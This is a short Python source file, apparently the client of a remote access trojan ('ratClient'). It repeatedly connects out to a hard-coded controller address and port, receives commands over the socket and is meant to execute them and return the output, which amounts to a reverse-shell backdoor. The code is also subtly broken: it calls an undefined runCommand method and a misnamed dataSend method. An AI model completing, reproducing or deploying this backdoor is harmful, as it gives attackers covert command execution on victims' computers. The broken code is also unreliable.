#Imports.
import socket, time, json, subprocess, base64, shutil, sys, os
from queue import Queue

#Make The Client Connect To The Host.
class Connector:
    def __init__(self,ip = "192.168.178.185",port = 7976):
        while True:
            try:
                self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.connection.connect((ip, port))
            except socket.error:
                time.sleep(5)
            else:
                break

#Send Data Back To The Host. 
    def SendData(self, data):
        jsonData = json.dumps(data)
        self.connection.send(jsonData.encode())

#Recieve Data From The Host. 
    def dataReceive(self):
        jsonData = b""
        while True:
            try:
                jsonData += self.connection.recv(2048)
                return json.loads(jsonData)
            except ValueError:
                continue

#Convert Array To String.
    def arrayToString(self, s):
        convStr = ""
        for i in s:
            convStr += i
        return convStr

#Run For Command Execution.
    def run(self):
        while True:
            command = self.dataReceive()
            try:
                if command[0] == "exit":
                    self.connection.close()
                    sys.exit()
                else:
                    convCommand = self.arrayToString(command)
                    commandResponse = self.runCommand(convCommand).decode()
            except Exception as e:
                commandResponse = (
                    f"[-] Error running command: {e}"
                )
            self.dataSend(commandResponse)

ratClient = Connector("192.168.178.185", 7976)
ratClient.run()